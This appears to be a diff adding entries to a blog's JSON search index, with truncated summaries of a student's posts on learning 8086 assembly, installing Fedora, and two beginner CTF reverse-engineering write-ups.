+      "url": "https://chujdk.github.io/asm-learn/%E7%8E%8B%E7%88%BD%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%AC%AC%E5%9B%9B%E7%89%88%E7%AC%AC%E5%85%AD%E7%AB%A0%E5%AE%9E%E9%AA%8C%E6%BA%90%E7%A0%81.html",
+      "date": "2020-10-18",
+      "summary": "assume cs:code,ds:data,ss:stack data segment dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h data ends stack segment dw 0,0,0,0,0,0,0,0 stack ends code segment start: mov ax,stack mov ss,ax mov sp,16 mov ax,data mov ds,ax push ds:[0] push ds:[2] pop ds:[2] pop ds:[0] mov ax,4c00h int 21h code ends end start assume cs:code,ds:data,ss:stack data segment dw 0123h,0456h,0123h,0456h,0123h,0456h,0123h,0456h,0123h,0456h,0123h,0456h,0123h,0456h,0123h,0456h stack segment dw 0,0 stack ends code segment start: mov ax,stack mov ss,ax mov sp,16 mov ax,data mov ds,ax push ds:[0] push ds:[2] pop ds:[2] pop ds:[0] mov ax,4c00h int 21h code ends end start assume cs:code,ds:data,ss:stack code segment start: mov ax,stack mov ss,ax mov sp,16 mov ax,data mov ds,ax push ds:[0] push ds:[2] pop ds:[2] pop ds:["
+    },
+    {
+      "title": "10.17汇编",
+      "url": "https://chujdk.github.io/asm-learn/10-17%E6%B1%87%E7%BC%96.html",
+      "date": "2020-10-17",
+      "summary": "November Rain 今天看了将近三章，效率还算不错 第四章过的很快，没什么特别的。 编译链接的过程 再强化一次，masm.exe:编译源代码，产生目标文件（.obj）,link.exe:链接目标文件，产生可执行文件(.exe)。"
+    },
+    {
+      "title": "10.16汇编",
+      "url": "https://chujdk.github.io/asm-learn/10-16%E6%B1%87%E7%BC%96.html",
+      "date": "2020-10-16",
+      "summary": "some nights 今天的进度非常慢，到11点多才刚刚结束了第三章，总体不是很满意。 SS,SP和栈的故事 SS是另一种段寄存器（至今为止碰到的第3种，之前的是CS（代码段寄存器）和DS（为[address]服务）），主要是为内存栈提供段地址，而SP则提供了偏移地址。内存栈以字为单位存储，同样是高地址存字的高位，因此每次SP改变的值都是2。"
+    },
+    {
+      "title": "近期的规划",
+      "url": "https://chujdk.github.io/mess/%E8%BF%91%E6%9C%9F%E7%9A%84%E8%A7%84%E5%88%92.html",
+      "date": "2020-10-15",
+      "summary": "想想还是有必要提前规划一下的，也算是督促一下自己 王爽的汇编语言，争取一天一章，从14号开始，大概就是在11月前完成，每天都开一篇博客记录一下。"
+    },
+    {
+      "title": "10.15汇编",
+      "url": "https://chujdk.github.io/asm-learn/10-15-ass.html",
+      "date": "2020-10-15",
+      "summary": "i remember you 今天只学习了2.12-3.5，进度稍微有一点落后，希望周末可以补回来 内存中字的存储 8086是16位的，显然一次可以处理16位的数据，虽然内存以字节为单位存储数据，但是仍然可以以字为单位存储，一个字为16位。存储字的内存单元被称为 字单元 。特别需要注意的一点， 字单元中，高地址单元存储高位 。"
+    },
+    {
+      "title": "10.14-汇编",
+      "url": "https://chujdk.github.io/asm-learn/10-14-ass.html",
+      "date": "2020-10-14",
+      "summary": "high enough 今天主要看的是第一章和2.1-2.10，第一章是对硬件的一些介绍，总体上没什么可说的，第二章讲的是寄存器，比较值得记录的是物理地址=段地址*16+偏移地址和CS代码段寄存器，和IP指令指针寄存器。"
+    },
+    {
+      "title": "open-source",
+      "url": "https://chujdk.github.io/wp/open-source.html",
+      "date": "2020-10-13",
+      "summary": "打开获得一个C源文件 if (argc != 4) { printf(\"what?\\n\"); exit(1); } 这里说明要有4个参数（包括程序名在内） unsigned int first = atoi(argv[1]); if (first != 0xcafe) { printf(\"you are wrong, sorry.\\n\"); exit(2); } 这里说明第二个参数的十六进制形式为cafe，十进制形式是51966。（atoi()是字符转整数的意思，是直接转，即\"134213\"转到134213）"
+    },
+    {
+      "title": "Hello, CTF",
+      "url": "https://chujdk.github.io/wp/hello-ctf.html",
+      "date": "2020-10-13",
+      "summary": "下载附件得到一个应用程序，shell里面跑一下 用IDA打开，按F5反编译 这里可以看到，flag就是437261636b4d654a757374466f7246756e，不过这是16进制的表示，转成字符就是"
+    },
+    {
+      "title": "汇编语言环境搭建",
+      "url": "https://chujdk.github.io/asm-learn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html",
+      "date": "2020-10-13",
+      "summary": "今天花了很多钱买书，《汇编语言》《逆向工程核心原理》和《加密与解密》，花了这么多，不好好看的话，就很亏，所以写个博客防止自己走马观花，同时也记录一下学习过程的心情。"
+    },
+    {
+      "title": "Linux(fedora) on U盘安装记",
+      "url": "https://chujdk.github.io/mess/linuxfedora-on-u%E7%9B%98%E5%AE%89%E8%A3%85%E8%AE%B0.html",
+      "date": "2020-10-11",
+      "summary": "我的电脑很奇怪，打不开VMware的安装包，一点开就闪退掉，网络上也几乎没有发现类似的问题，只在贴吧上面看到过一个兄弟有一样的问题，但是也没有解决方案，所以我没法拿这个做虚拟机，那么就只能用Virtual Box，实话说，Virtual Box还是不错的，开源又轻量，唯一的问题是太折腾，比如到现在我都没整好分辨率的问题。"
+    },
+    {
+      "title": "第一篇博客！！！",
+      "url": "https://chujdk.github.io/mess/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2.html",
+      "date": "2020-10-11",
+      "summary": "在九月买了阿里云的ecs服务器之后，我就开始着手博客的搭建，先是用宝塔完成了WP的部署，然而我发现这没有任何技术难度，想想又没有什么可以写的东西，于是我就直接重做了系统，自己配置了LAMP，然后抱着学习前后端的想法，准备自己写一个博客框架，于是那段时间的网站就变成了这样："
+    },
+    {
+      "title": "Middle of nowhere",
+      "url": "https://chujdk.github.io/404.html",
+      "date": "2001-01-01",
+      "summary": "Oops! 404.. There is nothing in this page 好吧，还是有的。熟悉我的朋友知道以前我的博客不长这样。的确，以前是基于 typecho 的动态博客，一直托管在我的阿里云服务器上。考虑到阿里云不是我家的，所以租的服务器当然会过期。"
+    }
+  ]
+}
